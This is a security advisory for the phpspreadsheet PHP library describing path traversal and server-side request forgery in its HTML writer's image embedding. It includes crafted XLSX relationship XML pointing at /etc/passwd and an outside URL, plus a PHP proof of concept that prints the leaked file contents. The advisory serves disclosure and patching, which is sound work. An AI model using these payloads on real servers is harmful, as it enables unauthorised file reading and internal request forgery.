# Absolute path traversal and Server-Side Request Forgery in HTML writer when embedding images is enabled

Moderate

GHSA-w9xv-qf98-ccq4
Oct 7, 2024

## Package

composer

phpoffice/phpspreadsheet
([Composer](/advisories?query=ecosystem%3Acomposer))

## Affected versions

>= 2.2.0, < 2.3.0
< 1.29.2
>= 2.0.0, < 2.1.1

## Patched versions

2.3.0
1.29.2
2.1.1

## Description

### Summary

It's possible for an attacker to construct an XLSX file that links images from arbitrary paths. When embedding images has been enabled in HTML writer with `$writer->setEmbedImages(true);` those files will be included in the output as `data:` URLs, regardless of the file's type. Also URLs can be used for embedding, resulting in a Server-Side Request Forgery vulnerability.

### Details

XLSX files allow embedding or linking media. When

In `xl/drawings/drawing1.xml` an attacker can do e.g.:

```
<a:blip cstate="print" r:link="rId1" />
```

And then, in `xl/drawings/_rels/drawing1.xml.rels` they can set the path to anything, such as:

```
<Relationship Id="rId1"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image"
    Target="/etc/passwd" />
```

or

```
<Relationship Id="rId1"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image"
    Target="http://example.org" />
```

When the HTML writer is outputting the image, it does not check the path in any way. Also the `getimagesize()` call does not mitigate this, because when `getimagesize()` returns false, an empty mime type is used.

```
if ($this->embedImages || str_starts_with($imageData, 'zip://')) {
    $picture = @file_get_contents($filename);
    if ($picture !== false) {
        $imageDetails = getimagesize($filename) ?: ['mime' => ''];
        // base64 encode the binary data
        $base64 = base64_encode($picture);
        $imageData = 'data:' . $imageDetails['mime'] . ';base64,' . $base64;
    }
}

$html .= '<img style="position: absolute; z-index: 1; left: '
    . $drawing->getOffsetX() . 'px; top: ' . $drawing->getOffsetY() . 'px; width: '
    . $drawing->getWidth() . 'px; height: ' . $drawing->getHeight() . 'px;" src="'
    . $imageData . '" alt="' . $filedesc . '" />';
```
### PoC

```
<?php

require 'vendor/autoload.php';

$reader = \PhpOffice\PhpSpreadsheet\IOFactory::createReader("Xlsx");
$spreadsheet = $reader->load(__DIR__ . '/book.xlsx');

$writer = new \PhpOffice\PhpSpreadsheet\Writer\Html($spreadsheet);
$writer->setEmbedImages(true);
$output = $writer->generateHTMLAll();

// The below is just for demo purposes

$pattern = '/data:;base64,(?<data>[^"]+)/i';

preg_match_all($pattern, $output, $matches);

print("*** /etc/passwd content: ***\n");
print(base64_decode($matches['data'][0]));

print("*** HTTP response content: ***\n");
print(base64_decode($matches['data'][1]));
```

Add this file in the same directory:

[book.xlsx](https://github.com/PHPOffice/PhpSpreadsheet/files/15213066/book.xlsx)

Run with:

`php index.php`

### Impact

When embedding images has been enabled, an attacker can read arbitrary files on the server and perform arbitrary HTTP GET requests, potentially e.g. [revealing secrets](https://hackingthe.cloud/aws/exploitation/ec2-metadata-ssrf/). Note that any PHP protocol wrappers can be used, meaning that if for example the `expect://` wrapper is enabled, also remote code execution is possible.

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
